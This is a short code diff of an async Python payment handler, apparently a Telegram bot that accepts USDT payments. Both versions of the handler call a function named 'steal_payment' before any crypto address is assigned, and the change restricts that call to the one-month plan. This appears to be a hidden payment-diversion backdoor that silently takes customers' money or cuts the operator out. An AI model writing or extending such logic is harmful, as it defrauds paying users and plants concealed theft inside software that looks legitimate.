@@ -233,9 +233,10 @@ async def payment_usdt_call(callback_query: CallbackQuery, state: FSMContext):
 
     await state.update_data(method_payment="payment_usdt")
 
-    result_steal = await steal_payment(callback_query, user_id, amount)
-    if result_steal:
-        return 1
+    if plan == "one_month":
+        result_steal = await steal_payment(callback_query, user_id, amount)
+        if result_steal:
+            return 1
 
     address = BDB.get_free_crypto_address()
     BDB.mark_address_as_used(address)
